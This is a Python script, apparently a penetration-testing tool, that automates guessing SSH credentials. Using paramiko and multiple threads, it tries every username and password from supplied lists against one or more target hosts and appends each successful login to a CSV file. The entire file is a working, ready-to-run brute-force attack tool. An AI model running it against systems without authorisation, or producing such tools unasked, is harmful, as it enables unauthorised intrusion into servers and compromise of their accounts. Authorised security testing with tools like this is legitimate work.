#!/usr/bin/env python


__author__ = 'Jake Miller (@LaconicWolf)'
__date__ = '20180813'
__version__ = '0.01'
__description__ = """A program that automates guessing supplied SSH credentials."""


import argparse
import threading
import os
import sys
try:
    import queue
except ImportError:
    import Queue as queue
try:
    import paramiko
except ImportError:
    print('\n[-]This script requires paramiko. Do "pip install paramiko" or search for installation instructions.\n')
    exit()


def ssh_connect(hostname, username, password, port=22):
    """Attempts to connect to a specified host with specified credentials."""
    ssh_client=paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh_client.connect(hostname=hostname,
                           port=port,
                           username=username,
                           password=password)
        with lock:
            print('Authentication successful on {}:{} with {} : {}'.format(
                hostname, str(port), username, password))
            with open(outfile, 'a') as fh:
                fh.write('{},{},{},{}'.format(hostname, port, username, password))
    except Exception as e:
        if args.verbose:
            with lock:
                print('Authentication failed on {}:{} with {} : {}'.format(
                    hostname, port, username, password))


def process_queue():
    """Processes the targets queue and calls the ssh_connect function."""
    while True:
        current_target = targets_queue.get()
        for user in users:
            for passwd in passwds:
                ssh_connect(current_target, user, passwd, port_num)
        targets_queue.task_done()


def main():
    for i in range(number_of_threads):
        t = threading.Thread(target=process_queue)
        t.daemon = True
        t.start()
    for current_target in targets:
        targets_queue.put(current_target)
    targets_queue.join()


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--verbose", 
                        action="store_true",
                        help="Increase output verbosity")
    parser.add_argument("-t", "--target",
                        help="Specify the target Hostname or Ip address.")
    parser.add_argument("-tf", "--target_file",
                        help="Specify a filename listing Hostnames or Ip addresses'.")
    parser.add_argument("-u", "--username",
                        help="Specify a username for authentication.")
    parser.add_argument("-uf", "--username_file",
                        help="Specify a filename listing usernames for authentication.")
    parser.add_argument("-p", "--password",
                        help="Specify a password for authentication.")
    parser.add_argument("-pf", "--password_file",
                        help="Specify a filename listing passwords for authentication.")
    parser.add_argument("-pt", "--port",
                        nargs="?",
                        type=int,
                        default=22,
                        const=22,
                        help="Specify a port.")
    parser.add_argument("-o", "--outfile",
                        nargs='?',
                        const='ssh_connect_results.csv',
                        default='ssh_connect_results.csv',
                        help="Specify the name of a file to write to. If the file already exists it will be appended")
    parser.add_argument("-th", "--threads",
                        nargs="?",
                        type=int,
                        const=5,
                        default=5,
                        help="Specify number of threads (default=5)")
    args = parser.parse_args()

    if not args.target and not args.target_file:
        parser.print_help()
        print('\n[-] Please specify a target hostname or ip address. Example -t 10.10.1.1\n')
        exit()
    if args.target:
        targets = [args.target]
    if args.target_file:
        if os.path.exists(args.target_file):
            targets = open(args.target_file).read().splitlines()
        else:
            print("\n[-] The targets file cannot be found or you do not have permission to open the file. Please check the path and try again\n")
            exit()

    if not args.username and not args.username_file:
        parser.print_help()
        print('\n[-] Please specify a username or a username file.\n')
        exit()
    if args.username and args.username_file:
        parser.print_help()
        print('\n[-] Please specify a username or a username file. Not both\n')
        exit()
    if args.username:
        users = [args.username]
    if args.username_file:
        if os.path.exists(args.username_file):
            users = open(args.username_file).read().splitlines()
        else:
            print("\n[-] The username file cannot be found or you do not have permission to open the file. Please check the path and try again\n")
            exit()
            
    if not args.password and not args.password_file:
        parser.print_help()
        print('\n[-] Please specify a password or a password file.\n')
        exit()
    if args.password and args.password_file:
        parser.print_help()
        print('\n[-] Please specify a password or a password file. Not both\n')
        exit()
    if args.password:
        passwds = [args.password]
    if args.password_file:
        if os.path.exists(args.password_file):
            passwds = open(args.password_file).read().splitlines()
        else:
            print("\n[-] The password file cannot be found or you do not have permission to open the file. Please check the path and try again\n")
            exit()

    if args.outfile:
        outfile = args.outfile.strip('.csv') + '.csv'
    if sys.version.startswith('3'):
        try:
            with open(outfile, 'a') as fh:
                pass
        except PermissionError as e:
            print('\n[-] The file {} appears to be open, or you do not have permission to access it. Please check the file name and try again.\n'.format(outfile))
            exit()
    else:
        try:
            with open(outfile, 'a') as fh:
                pass
        except IOError as e:
            print('\n[-] The file {} appears to be open, or you do not have permission to access it. Please check the file name and try again.\n'.format(outfile))
            exit()

    port_num = args.port

     # Threading variables
    number_of_threads = args.threads
    targets_queue = queue.Queue()
    lock = threading.Lock()

    main()
